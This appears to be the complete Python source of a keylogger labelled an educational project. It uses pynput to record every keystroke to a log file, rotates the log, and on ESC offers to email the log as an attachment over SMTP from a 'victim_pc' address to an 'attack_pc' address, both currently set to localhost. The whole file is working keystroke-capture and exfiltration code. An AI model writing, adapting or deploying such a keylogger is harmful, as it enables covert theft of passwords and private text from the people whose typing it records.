from pynput import keyboard
import os
import sys
import logging
from datetime import datetime
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import base64
import re


LOG_FILE = "keylogs.txt"
MAX_SIZE = 1024 * 1024  

# Email settings
SMTP_SERVER = "localhost"
SMTP_PORT = 1025
USE_TLS = False
SENDER_EMAIL = "victim_pc@localhost"
RECEIVER_EMAIL = "attack_pc@localhost"

def setup_logging():
    """Initialize logging configuration"""
    logging.basicConfig(
        filename=LOG_FILE,
        level=logging.DEBUG,
        format='%(asctime)s: %(message)s'
    )

def on_press(key):
    """Handle key press events"""
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.tab: "\n[TAB]\n",
            keyboard.Key.enter: "\n[ENTER]\n",
            keyboard.Key.backspace: "\n[BACKSPACE]\n",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.ctrl: "[CTRL]",
            keyboard.Key.alt: "[ALT]", 
        }
        
        if key in special_keys:
            logging.info(special_keys[key])
        else:
            logging.info(f"[{key}]")

def check_log_size():
    """Rotate log file if it gets too large"""
    if os.path.exists(LOG_FILE):
        if os.path.getsize(LOG_FILE) > MAX_SIZE:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            backup_file = f"keylog_{timestamp}.txt"
            os.rename(LOG_FILE, backup_file)

def decode_base64_logs(encoded_data):
    """Automatically decode base64 email attachments with proper padding handling"""
    try:
        
        base64_pattern = re.compile(r'base64\s*\n([A-Za-z0-9+/=\s]+)')
        match = base64_pattern.search(encoded_data)
        
        if not match:
            return None
            
        payload = match.group(1).replace("\n", "").replace("\r", "").strip()
        
        
        padding_needed = len(payload) % 4
        if padding_needed:
            payload += '=' * (4 - padding_needed)

        
        decoded = base64.b64decode(payload)
        try:
            return decoded.decode('utf-8')
        except UnicodeDecodeError:
           
            return decoded
    except Exception as e:
        print(f"[-] Decoding failed: {e}")
        return None

def send_logs_via_email():
    """Send the log file via email when keylogger stops"""
    if not os.path.exists(LOG_FILE):
        print("No log file to send")
        return

    try:
        # Create email message
        msg = MIMEMultipart()
        msg["From"] = SENDER_EMAIL
        msg["To"] = RECEIVER_EMAIL
        msg["Subject"] = "Keylogger Logs - Educational Project"

       
        msg.attach(MIMEText("Attached are the keylogger logs from the educational project.", "plain"))

       
        with open(LOG_FILE, "rb") as f:
            attachment = MIMEApplication(f.read(), _subtype="txt")
            attachment.add_header("Content-Disposition", "attachment", filename=LOG_FILE)
            msg.attach(attachment)

       
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            email_content = msg.as_string()
            server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, email_content)
            
            # Decode and display the sent content
            decoded_logs = decode_base64_logs(email_content)
            if decoded_logs:
                print("\n=== Email Content Preview ===")
                if isinstance(decoded_logs, bytes):
                    print("[Binary data - first 100 bytes]:")
                    print(decoded_logs[:100])
                else:
                    print(decoded_logs[:500] + ("..." if len(decoded_logs) > 500 else ""))
            else:
                print("Could not decode email content")
        
        print(f"\n[+] Logs sent to {RECEIVER_EMAIL}")

    except Exception as e:
        print(f"[-] Error sending email: {e}")

def main():
    print("Keylogger is Starting... (Press ESC to stop)")
    print(f"Logs will be saved to: {LOG_FILE}")
    setup_logging()
    check_log_size()

   
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

   
    with keyboard.Events() as events:
        for event in events:
            if isinstance(event, keyboard.Events.Press):
                if event.key == keyboard.Key.esc:
                    listener.stop()
                    print("\nKeylogger Stopped")
                    
                  
                    choice = input("Send logs via email? (y/n): ").lower()
                    if choice == 'y':
                        send_logs_via_email()
                    
                    print(f"Logs saved to: {LOG_FILE}")
                    sys.exit(0)

if __name__ == "__main__":
    main()
